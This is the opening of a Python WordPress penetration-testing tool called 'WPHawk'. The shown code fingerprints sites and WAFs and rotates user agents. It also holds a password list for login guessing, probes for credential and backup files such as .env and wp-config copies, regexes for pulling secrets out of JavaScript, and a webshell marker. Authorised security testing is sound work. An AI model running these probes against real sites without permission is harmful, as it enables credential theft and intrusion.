#!/usr/bin/env python3

import asyncio
import aiohttp
import json
import re
import argparse
import random
import os
import sys
import time
import hashlib
import datetime
from urllib.parse import urljoin, urlparse
from dataclasses import dataclass, field

# ─────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ─────────────────────────────────────────────────────────────────────────────
try:
    import aiosqlite
except ImportError:
    print("[!] Missing dependency: pip install aiosqlite")
    sys.exit(1)

try:
    import yaml as _yaml
    _YAML_OK = True
except ImportError:
    _YAML_OK = False

# ─────────────────────────────────────────────────────────────────────────────
# TERMINAL INIT  — must run before any colored output
# ─────────────────────────────────────────────────────────────────────────────
def _init_terminal():
    """
    Enable ANSI / VT100 color processing and UTF-8 output on every platform.

    Linux / macOS  — already works; we only ensure UTF-8 stdout.
    Windows 10+    — ConHost does NOT enable VT100 by default.  We flip
                     ENABLE_VIRTUAL_TERMINAL_PROCESSING via SetConsoleMode
                     and switch the code-page to UTF-8 (65001) so box-
                     drawing / Unicode icons render instead of showing ?.
    Windows Terminal / VS Code terminal already have VT100 on; the call
    is a no-op in those environments.
    """
    # ── Force UTF-8 on stdout / stderr ───────────────────────────────────────
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            try:
                stream.reconfigure(encoding="utf-8", errors="replace")
            except Exception:
                pass

    if sys.platform != "win32":
        return  # Linux / macOS: done

    # ── Windows: flip ENABLE_VIRTUAL_TERMINAL_PROCESSING on both handles ─────
    try:
        import ctypes, ctypes.wintypes
        ENABLE_VT = 0x0004
        k32 = ctypes.windll.kernel32
        for handle_id in (-10, -11, -12):   # stdin, stdout, stderr
            h    = k32.GetStdHandle(handle_id)
            mode = ctypes.wintypes.DWORD()
            if k32.GetConsoleMode(h, ctypes.byref(mode)):
                k32.SetConsoleMode(h, mode.value | ENABLE_VT)
    except Exception:
        pass

    # ── Windows: switch console code-page to UTF-8 ───────────────────────────
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass


# ── Run immediately so the very first print() already has colors ─────────────
_init_terminal()

# ── NO_COLOR standard (https://no-color.org) + piped-output fallback ─────────
# Set env var NO_COLOR=1 or pipe output to disable all ANSI sequences.
_COLOR_ENABLED = (
    os.environ.get("NO_COLOR", "") == ""
    and os.environ.get("TERM", "") != "dumb"
    and (sys.stdout.isatty() or sys.platform == "win32")
)

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
class C:
    # ── Foreground ────────────────────────────────────────────────────────────
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    RED     = '\033[91m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE   = '\033[97m'
    # ── Styles ────────────────────────────────────────────────────────────────
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    ITALIC  = '\033[3m'
    RESET   = '\033[0m'
    # ── Backgrounds (used for severity badges) ────────────────────────────────
    BG_RED    = '\033[41m'
    BG_YELLOW = '\033[43m'
    BG_GREEN  = '\033[42m'
    BG_CYAN   = '\033[46m'
    BG_DARK   = '\033[100m'

def _c(code, s):
    return f"{code}{s}{C.RESET}" if _COLOR_ENABLED else str(s)

def g(s):    return _c(C.GREEN,   s)
def y(s):    return _c(C.YELLOW,  s)
def r(s):    return _c(C.RED,     s)
def b(s):    return _c(C.BLUE,    s)
def mag(s):  return _c(C.MAGENTA, s)
def wht(s):  return _c(C.WHITE,   s)
def cyan(s): return _c(C.CYAN,    s)
def dim(s):  return _c(C.DIM,     s)
def bold(s): return _c(C.BOLD,    s)

def _ansi(code):
    """Return an ANSI escape code only when color is enabled."""
    return code if _COLOR_ENABLED else ""

def _term_width():
    try:    return os.get_terminal_size().columns
    except: return 90

def rand_ua():
    return random.choice(USER_AGENTS)

def hdr(extra=None):
    h = {"User-Agent": rand_ua()}
    if extra:
        h.update(extra)
    return h

def info(msg):  print(f"  {_ansi(C.CYAN)}◈{_ansi(C.RESET)}  {msg}")
def ok(msg):    print(f"  {_ansi(C.GREEN)}✔{_ansi(C.RESET)}  {msg}")
def warn(msg):  print(f"  {_ansi(C.YELLOW)}▲{_ansi(C.RESET)}  {msg}")
def err(msg):   print(f"  {_ansi(C.RED)}✘{_ansi(C.RESET)}  {msg}")
def pwn(msg):   print(f"  {_ansi(C.BG_RED)}{_ansi(C.WHITE)}{_ansi(C.BOLD)} PWN {_ansi(C.RESET)}  {_ansi(C.RED)}{_ansi(C.BOLD)}{msg}{_ansi(C.RESET)}")
def fail(msg):  print(f"  {_ansi(C.DIM)}·{_ansi(C.RESET)}  {_ansi(C.DIM)}{msg}{_ansi(C.RESET)}")

def section(title):
    w   = _term_width()
    pre = f"\n  {_ansi(C.CYAN)}{_ansi(C.BOLD)}❯{_ansi(C.RESET)}  {_ansi(C.WHITE)}{_ansi(C.BOLD)}{title}{_ansi(C.RESET)}  "
    pad = w - len(_strip_ansi(pre))
    print(f"{pre}{_ansi(C.DIM)}{'─' * max(pad, 4)}{_ansi(C.RESET)}")

def _strip_ansi(s):
    return re.sub(r'\033\[[0-9;]*m', '', s)

# ─────────────────────────────────────────────────────────────────────────────
# USER AGENTS
# ─────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15",
]

# ─────────────────────────────────────────────────────────────────────────────
# BUILT-IN WORDLISTS
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PLUGINS = [
    "contact-form-7","woocommerce","elementor","yoast-seo","wordfence",
    "jetpack","akismet","wpforms-lite","classic-editor","really-simple-ssl",
    "all-in-one-seo-pack","updraftplus","mailchimp-for-wp","redirection",
    "limit-login-attempts-reloaded","wp-super-cache","w3-total-cache",
    "ninja-forms","advanced-custom-fields","wp-smushit","duplicator",
    "all-in-one-wp-migration","wp-file-manager","litespeed-cache","autoptimize",
    "rank-math","tinymce-advanced","tablepress","wp-mail-smtp",
    "wpml-multilingual-cms","polylang","wp-optimize","broken-link-checker",
    "metaslider","revolution-slider","essential-addons-for-elementor",
    "ocean-extra","generatepress","beaver-builder-plugin","siteground-optimizer",
    "cookie-notice","google-analytics-for-wordpress","loginizer",
    "user-role-editor","members","wp-fastest-cache","hummingbird-performance",
    "defender-security","404-to-301","easy-wp-smtp","wp-statistics",
    "insert-headers-and-footers","classic-widgets","simple-custom-post-order",
    "wp-sitemap-page","the-events-calendar","tribe-common","bbpress","buddypress",
    "woocommerce-pdf-invoices-packing-slips","woocommerce-gateway-stripe",
    "wpml-string-translation","gravityforms","gravity-forms",
]

BUILTIN_THEMES = [
    "twentytwentyfour","twentytwentythree","twentytwentytwo","twentytwentyone",
    "twentytwenty","twentynineteen","astra","oceanwp","generatepress",
    "hello-elementor","storefront","divi","avada","bridge","flatsome",
    "salient","enfold","jupiter","the7","newspaper","publisher","jannah",
    "sahifa","soledad","betheme","porto","woodmart","uncode","impreza",
    "total","kallyas","beaverbuilder-theme",
]

BUILTIN_PASSWORDS = [
    "admin","password","123456","admin123","wordpress","letmein","qwerty",
    "111111","abc123","password1","iloveyou","sunshine","princess","dragon",
    "master","login","welcome","shadow","1234","12345","123456789","pass",
    "test","admin1","administrator","root","toor","pass123","changeme",
    "default","pass1234","wordpress123","wp123","webmaster","hosting",
    "server","localhost","secret","admin@123","P@ssword","P@ssw0rd",
    "password123","Password1","Admin123","Welcome1","Summer2024","Winter2024",
    "Spring2024","Autumn2024","company123","secure123","test123","hello",
    "hello123","guest","guest123","user","user123","backup","backup123",
    "support","qwerty123","abc1234","superman","batman","monkey","football",
    "2024","2023","1234567","12345678","1234567890","pass@123","admin@2024",
]

WP_SENSITIVE_FILES = [
    "wp-config.php.bak","wp-config.php~","wp-config.php.old","wp-config.php.orig",
    "wp-config.bak",".wp-config.php.swp","wp-config.php.save","wp-config.php.txt",
    "readme.html","license.txt","wp-content/debug.log",".git/HEAD",".git/config",
    ".git/COMMIT_EDITMSG",".git/refs/heads/master",
    "wp-admin/install.php","wp-admin/setup-config.php","error_log",".env",
    "phpinfo.php","info.php","wp-cron.php","wp-content/uploads/.htaccess",
    ".htpasswd","backup.zip","backup.sql","db.sql","database.sql","dump.sql",
    "wp-content/backups/","wp-content/uploads/wpforms/",".DS_Store","thumbs.db",
    # Common admin tools left exposed
    "phpMyAdmin/index.php","phpmyadmin/index.php","pma/index.php",
    "adminer.php","adminer/","dbadmin/","mysqladmin/",
    # Server diagnostics
    "server-status","server-info",
    # CI/CD & infra files
    ".travis.yml","Dockerfile","docker-compose.yml","docker-compose.yaml",
    "composer.json","package.json",".npmrc",".env.production",".env.local",
    # WordPress-specific
    "wp-content/ai1wm-backups/","wp-snapshots/",
    "wp-content/plugins/all-in-one-wp-migration/storage/",
    "wp-content/uploads/backupbuddy_backups/",
    # Log files
    "wp-admin/error_log","wp-includes/error_log",
    "wp-content/uploads/error_log",
    # WordPress temp / install artefacts
    "wp-admin/maint/repair.php",
    # WordPress wlwmanifest — WP fingerprint, sometimes leaks install path
    "wlwmanifest.xml",
    # IIS / PHP config overrides
    ".user.ini", "web.config.bak", "web.config.old",
    # FTP / SFTP credentials
    "sftp-config.json", ".ftpconfig", ".ftp-sync.json",
    # Rotated / alternate debug log paths
    "wp-content/debug.log.1", "wp-content/debug.log.bak",
    "error_log", "php_error.log", "wp-content/php_error.log",
    "wp-content/uploads/error_log",
    # wp-activate / signup (open registration / multisite intel)
    "wp-activate.php", "wp-signup.php",
    # Admin login page (custom or default)
    "wp-login.php",
]

# ── Backup filename patterns for --scan-backups ───────────────────────────────
BACKUP_FILENAME_PATTERNS = [
    "backup.zip","backup.tar.gz","backup.tar.bz2",
    "wordpress.zip","wordpress.tar.gz","wp-content.zip",
    "www.zip","site.zip","web.zip","html.zip","public_html.zip",
    "backup.sql","db.sql","database.sql","wordpress.sql","dump.sql","mysql.sql",
    "wp-backup.zip","site-backup.zip","full-backup.zip",
    "wp-db.sql","wp-database.sql","wpdb.sql",
    "files.zip","uploads.zip",
]

# ── Upload crawler — sensitive filenames & plugin-specific subdirs ────────────
UPLOAD_SENSITIVE_NAMES = [
    "backup","dump","export","import","database","db","wordpress","users",
    "customers","orders","subscribers","emails","admin","config","secrets",
    "credentials","private","data","full","site","sql","archive",
]
UPLOAD_PLUGIN_DIRS = [
    "wpforms","woocommerce_uploads","backupbuddy_backups","updraftplus",
    "ai1wm-backups","wp-migrate-db","duplicator","ninja-forms-uploads",
    "elementor","cache","sites","uploadify","gravity_forms","fluentform",
    "wp-all-import","wpml","xcloner-backup","backwpup","wp-db-backup",
]
UPLOAD_SENSITIVE_EXTENSIONS = (
    ".sql",".sql.gz",".sql.bz2",".zip",".tar.gz",".tar.bz2",".bak",
    ".old",".orig",".xlsx",".xls",".csv",".xml",".env",".key",
    ".pem",".p12",".log",".php",".json",
)

# ── WordPress drop-in files (run before almost everything — backdoor targets) ─
WP_DROPIN_FILES = [
    "wp-content/db.php",
    "wp-content/object-cache.php",
    "wp-content/advanced-cache.php",
    "wp-content/fatal-error-handler.php",
    # Multisite / sunrise drop-in (persistence through MU installs)
    "wp-content/sunrise.php",
    # Maintenance mode — can be weaponised to serve phishing during legit maintenance
    "wp-content/maintenance.php",
    # Custom DB error page — can leak config or serve redirects
    "wp-content/db-error.php",
]

# ── TimThumb paths ────────────────────────────────────────────────────────────
TIMTHUMB_GENERIC_PATHS = [
    "timthumb.php","thumb.php","lib/timthumb.php",
    "wp-content/timthumb.php","wp-includes/timthumb.php",
]

# ── WAF signatures (header keys or cookie name fragments) ────────────────────
WAF_SIGNATURES = {
    "Cloudflare":  ["CF-RAY","cf-cache-status","__cfduid","cf-request-id","CF-Connecting-IP"],
    "Sucuri":      ["X-Sucuri-ID","X-Sucuri-Cache","X-Sucuri-Block"],
    "Wordfence":   ["X-Wordfence-Cache","wf_loginalerted"],
    "Akamai":      ["X-Akamai-Transformed","X-Check-Cacheable","Akamai-Cache-Status","X-Akamai-Session-Incoming"],
    "Imperva":     ["X-Iinfo","incap_ses","visid_incap","nlbi_"],
    "SiteLock":    ["X-SiteLock-Request-Type","SiteLock"],
    "AWS WAF":     ["x-amzn-requestid","x-amz-cf-id","x-amz-cf-pop","x-amz-waf"],
    "Barracuda":   ["barra_counter_session","BNI__BARRACUDA_LB_COOKIE"],
    "F5 BIG-IP":   ["BigIP","BIGipServer","F5_ST","TS"],
    "Fastly":      ["X-Fastly-Request-ID","Fastly-Debug-Path","x-served-by"],
    "Varnish":     ["X-Varnish","Via"],
    "ModSecurity": ["Mod_Security","NOYB"],
    "Incapsula":   ["X-Iinfo","X-CDN"],
    "Reblaze":     ["x-reblaze-protection"],
}

SECURITY_HEADERS = [
    "Strict-Transport-Security","X-Frame-Options","X-Content-Type-Options",
    "Content-Security-Policy","Referrer-Policy","Permissions-Policy","X-XSS-Protection",
]

# Patterns for JS secret extraction
JS_SECRET_PATTERNS = {
    "API Key":          re.compile(r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', re.I),
    "Secret":           re.compile(r'(?:secret|token|password|passwd|pwd)\s*[=:]\s*["\']([A-Za-z0-9_\-!@#$%]{8,})["\']', re.I),
    "AWS Key":          re.compile(r'AKIA[0-9A-Z]{16}'),
    "Bearer Token":     re.compile(r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)'),
    "WP Nonce":         re.compile(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', re.I),
    "Email":            re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'),
    "AJAX Endpoint":    re.compile(r'(?:ajaxurl|ajax_url)\s*[=:]\s*["\']([^"\']+)["\']', re.I),
    "Hardcoded URL":    re.compile(r'https?://[^\s"\'<>{}\[\]]+', re.I),
    "WP Action":        re.compile(r'action["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{4,})["\']', re.I),
}

WEBSHELL_MARKER = hashlib.md5(b"wphawk_pwned_v2").hexdigest()

# ─────────────────────────────────────────────────────────────────────────────
# DATACLASSES
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class CVEEntry:
    cve_id: str
    cvss_score: float
    severity: str
    description: str
    published: str
    references: list
    exploit_available: bool
    exploit_db_id: str
    exploit_url: str
    source: str
    fixed_in: str = ""        # version where this CVE was fixed
    is_patched: bool = False  # True if detected version >= fixed_in

@dataclass
class PluginEntry:
    slug: str
    version: str
    detected_by: str
    readme_url: str
    asset_type: str           # plugin | theme
    latest_version: str = ""  # from WP.org API
    is_outdated: bool = False
    last_updated: str = ""
    version_source: str = ""  # which file yielded the version
    cves: list = field(default_factory=list)
    vulnerable_cves: list = field(default_factory=list)   # CVEs where version < fixed_in
    exploited: bool = False
    exploit_results: list = field(default_factory=list)

@dataclass
class UserEntry:
    id: int
    name: str
    slug: str
    detected_by: str
    password: str = ""

@dataclass
class ExploitResult:
    plugin_slug: str
    cve_id: str
    exploit_type: str
    success: bool
    evidence: str
    payload_used: str

@dataclass
class JsFinding:
    js_url: str
    finding_type: str
    value: str

@dataclass
class RestEndpoint:
    route: str
    methods: list
    auth_required: bool
    response_preview: str

@dataclass
class ScanResult:
    target_url: str
    is_wordpress: bool = False
    wp_version: str = ""
    wp_version_sources: list = field(default_factory=list)
    plugins: list = field(default_factory=list)
    themes: list = field(default_factory=list)
    users: list = field(default_factory=list)
    sensitive_files: list = field(default_factory=list)
    xmlrpc_accessible: bool = False
    xmlrpc_multicall: bool = False
    registration_open: bool = False
    directory_listing: bool = False
    wpcron_exposed: bool = False
    security_headers: dict = field(default_factory=dict)
    wp_core_cves: list = field(default_factory=list)
    exploit_results: list = field(default_factory=list)
    errors: list = field(default_factory=list)
    server_info: dict = field(default_factory=dict)
    # v2.0 additions
    js_findings: list = field(default_factory=list)
    rest_endpoints: list = field(default_factory=list)
    robots_paths: list = field(default_factory=list)
    sitemap_urls: list = field(default_factory=list)
    subdomains: list = field(default_factory=list)
    outdated_plugins: list = field(default_factory=list)  # refs to outdated PluginEntry objects
    # v3.0 additions
    is_multisite: bool = False
    custom_admin_url: str = ""
    waf_list: list = field(default_factory=list)
    debug_log_findings: list = field(default_factory=list)
    http_method_findings: list = field(default_factory=list)
    backup_files: list = field(default_factory=list)
    timthumb_findings: list = field(default_factory=list)
    login_confirmed_users: list = field(default_factory=list)
    template_results: list = field(default_factory=list)
    # v3.2 additions — upload crawler, dropin check, mu-plugins, graphql
    upload_findings: list = field(default_factory=list)
    dropin_findings: list = field(default_factory=list)
    mu_plugin_findings: list = field(default_factory=list)
    graphql_endpoint: str = ""
    graphql_types: list = field(default_factory=list)

# ─────────────────────────────────────────────────────────────────────────────
# RATE LIMITER  (token-bucket, async-safe)
# ─────────────────────────────────────────────────────────────────────────────
class RateLimiter:
    """
    Enforces a maximum req/s across all concurrent coroutines.
    Uses a simple async Lock + time-delta approach.  Thread of execution:
      acquire() → sleep if last request was < min_interval ago → release.
    total_sent tracks lifetime requests so we can report RPS at the end.
    """
    def __init__(self, rps: float = 10.0):
        self._unlimited    = (rps <= 0)
        self._interval     = 1.0 / max(rps, 0.001)
        self._lock         = asyncio.Lock()
        self._last         = 0.0
        self.total_sent    = 0
        self._started_at   = 0.0

    async def acquire(self):
        self.total_sent += 1
        if self._unlimited:
            return
        async with self._lock:
            loop = asyncio.get_event_loop()
            now  = loop.time()
            if self._started_at == 0.0:
                self._started_at = now
            gap  = self._interval - (now - self._last)
            if gap > 0:
                await asyncio.sleep(gap)
            self._last = asyncio.get_event_loop().time()

    @property
    def elapsed(self) -> float:
        return asyncio.get_event_loop().time() - self._started_at if self._started_at else 0.0

    def stats(self) -> str:
        el  = self.elapsed
        rps = self.total_sent / el if el > 0 else 0.0
        return f"{self.total_sent} requests · {el:.1f}s · {rps:.1f} req/s"


class _ThrottledCtx:
    """
    Wraps aiohttp's _RequestContextManager so the rate-limiter fires
    BEFORE the actual request, regardless of whether the caller uses:
      • async with session.get(url) as resp:   (context-manager path)
      • resp = await session.get(url)          (awaitable path)
    Both paths are supported transparently.
    """
    __slots__ = ("_limiter", "_ctx")

    def __init__(self, limiter: "RateLimiter", ctx):
        self._limiter = limiter
        self._ctx     = ctx

    # ── async with session.get(...) as resp ──────────────────────────────────
    async def __aenter__(self):
        await self._limiter.acquire()
        return await self._ctx.__aenter__()

    async def __aexit__(self, *exc):
        return await self._ctx.__aexit__(*exc)

    # ── resp = await session.get(...) ────────────────────────────────────────
    def __await__(self):
        async def _run():
            await self._limiter.acquire()
            return await self._ctx
        return _run().__await__()


class RateLimitedSession:
    """
    Drop-in proxy for aiohttp.ClientSession.
    .get / .post / .head / .request return _ThrottledCtx objects so every
    outbound request passes through the rate limiter — regardless of which
    scan phase fires it and whether the caller uses `async with` or `await`.
    Everything else (cookie_jar, close, headers…) delegates transparently.
    """
    def __init__(self, session, limiter: RateLimiter):
        self._session = session
        self._limiter = limiter

    def get(self, url, **kw):
        return _ThrottledCtx(self._limiter, self._session.get(url, **kw))

    def post(self, url, **kw):
        return _ThrottledCtx(self._limiter, self._session.post(url, **kw))

    def head(self, url, **kw):
        return _ThrottledCtx(self._limiter, self._session.head(url, **kw))

    def request(self, method, url, **kw):
        return _ThrottledCtx(self._limiter, self._session.request(method, url, **kw))

    def __getattr__(self, name):
        return getattr(self._session, name)


# ─────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    base = f"{p.scheme}://{p.netloc}{p.path}"
    if not base.endswith("/"):
        base += "/"
    return base

def version_lt(v1, v2):
    """Return True if v1 < v2 as semantic version."""
    if not v1 or not v2:
        return False
    try:
        def parts(v):
            return [int(x) for x in re.split(r'[.\-]', str(v)) if x.isdigit()]
        p1, p2 = parts(v1), parts(v2)
        while len(p1) < len(p2): p1.append(0)
        while len(p2) < len(p1): p2.append(0)
        return p1 < p2
    except Exception:
        return False

def version_gte(v1, v2):
    return not version_lt(v1, v2)

def cvss_to_severity(score):
    if score >= 9.0: return "CRITICAL"
    if score >= 7.0: return "HIGH"
    if score >= 4.0: return "MEDIUM"
    return "LOW"

def severity_tag(sev, score=None):
    sc  = f" {score}" if score else ""
    sev = (sev or "").upper()
    if sev == "CRITICAL":
        return f"{_ansi(C.BG_RED)}{_ansi(C.WHITE)}{_ansi(C.BOLD)} CRIT{sc} {_ansi(C.RESET)}"
    if sev == "HIGH":
        return f"{_ansi(C.RED)}{_ansi(C.BOLD)} HIGH{sc} {_ansi(C.RESET)}"
    if sev == "MEDIUM":
        return f"{_ansi(C.YELLOW)} MED{sc} {_ansi(C.RESET)}"
    if sev == "LOW":
        return f"{_ansi(C.DIM)} LOW{sc} {_ansi(C.RESET)}"
    return f"[{sev}]"

def load_wordlist(path, silent=False):
    if not path:
        return None
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        if not silent:
            warn(f"Wordlist not found: {path} — using built-in")
        return None

def _load_wl_auto(explicit_path, auto_path):
    """Load wordlist: use explicit path with warning, else try auto_path silently."""
    if explicit_path:
        return load_wordlist(explicit_path)
    return load_wordlist(auto_path, silent=True)

def print_banner():
    D  = _ansi(C.DIM)   + _ansi(C.CYAN)
    B  = _ansi(C.BOLD)  + _ansi(C.CYAN)
    W  = _ansi(C.BOLD)  + _ansi(C.WHITE)
    DC = _ansi(C.DIM)   + _ansi(C.CYAN)
    Cy = _ansi(C.CYAN)
    Di = _ansi(C.DIM)
    RS = _ansi(C.RESET)
    print(f"""
{D}  ╔══════════════════════════════════════════════════════╗{RS}
{D}  ║{RS}                                                      {D}║{RS}
{D}  ║{RS}   {W}WPHawk  v3.2{RS}  {DC}·{RS}  {B}WordPress Pentest Framework{RS}   {D}║{RS}
{D}  ║{RS}                                                      {D}║{RS}
{D}  ╠══════════════════════════════════════════════════════╣{RS}
{D}  ║  {Cy}◈{RS}{Di}  Recon  ·  CVE Engine  ·  Exploit  ·  Upload Crawl{RS}  {D}║{RS}
{D}  ║  {Cy}◈{RS}{Di}  Rate Limiter  ·  GraphQL  ·  MU-Plugins  ·  387+{RS}   {D}║{RS}
{D}  ╚══════════════════════════════════════════════════════╝{RS}
""")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 — FINGERPRINTING
# ─────────────────────────────────────────────────────────────────────────────
async def fetch_homepage(session, base_url, timeout=30):
    try:
        async with session.get(base_url, headers=hdr(), timeout=timeout, allow_redirects=True) as resp:
            text = await resp.text(errors="replace")
            return text, resp
    except Exception:
        return "", None

async def detect_wordpress(session, result, html, resp):
    if resp is None:
        result.errors.append("Could not connect to target")
        return False
    x_gen    = resp.headers.get("X-Generator", "")
    x_power  = resp.headers.get("X-Powered-By", "")
    link_hdr = resp.headers.get("Link", "")
    x_ping   = resp.headers.get("X-Pingback", "")
    final    = str(resp.url)
    signals = [
        bool(re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress', html, re.I)),
        "wp-content/" in html,
        "wp-includes/" in html,
        "WordPress" in x_gen,
        "WordPress" in x_power,
        "wp-login.php" in html,
        "/wp-json/" in html,
        # Link: </?rest_route=/>; rel="https://api.w.org/" — most reliable passive signal
        "api.w.org" in link_hdr,
        # X-Pingback header only appears on WordPress installs
        "xmlrpc.php" in x_ping,
        # wlwmanifest.xml is WordPress-exclusive
        "wlwmanifest.xml" in html,
    ]
    if not any(signals):
        # Active fallback: HEAD wp-login.php — unambiguous WP path
        try:
            async with session.request("HEAD", urljoin(result.target_url, "wp-login.php"),
                                       headers=hdr(), timeout=8,
                                       allow_redirects=False) as rh:
                if rh.status in (200, 302, 301, 303):
                    signals.append(True)
        except Exception:
            pass
    if any(signals):
        result.is_wordpress = True
        if "wp-login.php" in final:
            warn("Target redirected to wp-login.php — may require authentication")
        return True
    err("Target does not appear to be WordPress")
    return False

async def detect_wp_version(session, result, html):
    async def _gen(html):
        m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress\s*([\d.]+)', html, re.I)
        return (m.group(1) if m else None), "generator meta tag"

    async def _readme(session, base):
        try:
            async with session.get(urljoin(base, "readme.html"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'Version\s*([\d.]+)', t, re.I)
                    return (m.group(1) if m else None), "readme.html"
        except Exception:
            pass
        return None, "readme.html"

    async def _rss(session, base):
        try:
            async with session.get(urljoin(base, "?feed=rss2"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'<generator>[^<]*?v=([\d.]+)<', t)
                    if not m:
                        m = re.search(r'WordPress/([\d.]+)', t)
                    return (m.group(1) if m else None), "RSS feed"
        except Exception:
            pass
        return None, "RSS feed"

    async def _license(session, base):
        try:
            async with session.get(urljoin(base, "license.txt"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    t = await r.text(errors="replace")
                    m = re.search(r'WordPress\s*-[^\n]*\n.*?Version\s*([\d.]+)', t, re.I | re.S)
                    return (m.group(1) if m else None), "license.txt"
        except Exception:
            pass
        return None, "license.txt"

    async def _assets(html):
        vers = re.findall(r'wp-includes/[^"\'?]+\?ver=([\d.]+)', html)
        if vers:
            from collections import Counter
            v = Counter(vers).most_common(1)[0][0]
            return v, "enqueued assets ?ver="
        return None, "assets"

    async def _wpjson(session, base):
        try:
            async with session.get(urljoin(base, "wp-json/"), headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    gen = data.get("generator", "") or data.get("gmt_offset", "")
                    # generator field: "https://wordpress.org/?v=6.5.3"
                    m = re.search(r'\?v=([\d.]+)', data.get("generator", ""))
                    if m:
                        return m.group(1), "wp-json generator"
        except Exception:
            pass
        return None, "wp-json generator"

    items = await asyncio.gather(
        _gen(html), _readme(session, result.target_url),
        _rss(session, result.target_url), _license(session, result.target_url),
        _assets(html), _wpjson(session, result.target_url),
        return_exceptions=True
    )
    for item in items:
        if isinstance(item, Exception):
            continue
        ver, src = item
        if ver:
            if not result.wp_version:
                result.wp_version = ver
            if src not in result.wp_version_sources:
                result.wp_version_sources.append(src)

async def detect_server_info(session, result, resp):
    if resp is None:
        return
    h = resp.headers
    cf  = h.get("CF-RAY", "")
    suc = h.get("X-Sucuri-ID", "")
    wf  = h.get("X-Wordfence-Cache", "")
    result.server_info = {
        "server": h.get("Server", "Unknown"),
        "php":    h.get("X-Powered-By", "Unknown"),
        "waf":    "Cloudflare" if cf else "Sucuri" if suc else "Wordfence" if wf else "None detected",
    }

async def detect_waf_advanced(session, result, resp, html):
    """Comprehensive WAF / CDN fingerprinting from headers + body content."""
    detected = []
    if resp is None:
        return detected
    resp_headers = dict(resp.headers)
    flat_headers  = " ".join(f"{k}={v}" for k, v in resp_headers.items()).lower()
    flat_cookies  = " ".join(str(c) for c in resp.cookies.keys()).lower()

    for waf_name, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in flat_headers or sig.lower() in flat_cookies:
                if waf_name not in detected:
                    detected.append(waf_name)

    # Body-based tells
    html_lower = html.lower()
    body_tells = [
        ("sucuri cloudproxy",   "Sucuri"),
        ("wordfence",           "Wordfence"),
        ("blocked by cloudflare", "Cloudflare"),
        ("incapsula",           "Imperva/Incapsula"),
        ("barracuda networks",  "Barracuda"),
    ]
    for pattern, name in body_tells:
        if pattern in html_lower and name not in detected:
            detected.append(name)

    result.waf_list = detected
    result.server_info["waf"] = ", ".join(detected) if detected else "None detected"
    return detected

async def detect_multisite(session, result, html):
    """Detect WordPress Multisite / Network installation."""
    signals = [
        "/wp-signup.php"   in html,
        "/wp-activate.php" in html,
        "wp-network-admin" in html,
        bool(re.search(r'DOMAIN_CURRENT_SITE|SITE_ID_CURRENT_SITE|wp-network', html)),
    ]
    # Probe wp-signup.php directly
    try:
        async with session.get(urljoin(result.target_url, "wp-signup.php"),
                               headers=hdr(), timeout=10) as r:
            if r.status == 200:
                t = await r.text(errors="replace")
                if any(kw in t.lower() for kw in ["signup","register","blogname","user_name"]):
                    signals.append(True)
    except Exception:
        pass
    result.is_multisite = any(signals)

async def detect_custom_admin_path(session, result):
    """Detect if wp-admin was moved via security plugins (all-in-one-wp, WPS Hide Login, etc.)."""
    try:
        async with session.get(urljoin(result.target_url, "wp-admin/"),
                               headers=hdr(), timeout=10, allow_redirects=True) as r:
            final_url = str(r.url)
            # If we landed somewhere other than wp-login.php or wp-admin/
            if "wp-login.php" not in final_url and r.status == 200:
                body = await r.text(errors="replace")
                if "user_login" in body or "loginform" in body:
                    result.custom_admin_url = final_url
    except Exception:
        pass

async def check_security_headers(session, result):
    try:
        async with session.get(result.target_url, headers=hdr(), timeout=15) as resp:
            for h in SECURITY_HEADERS:
                result.security_headers[h] = resp.headers.get(h)
    except Exception as e:
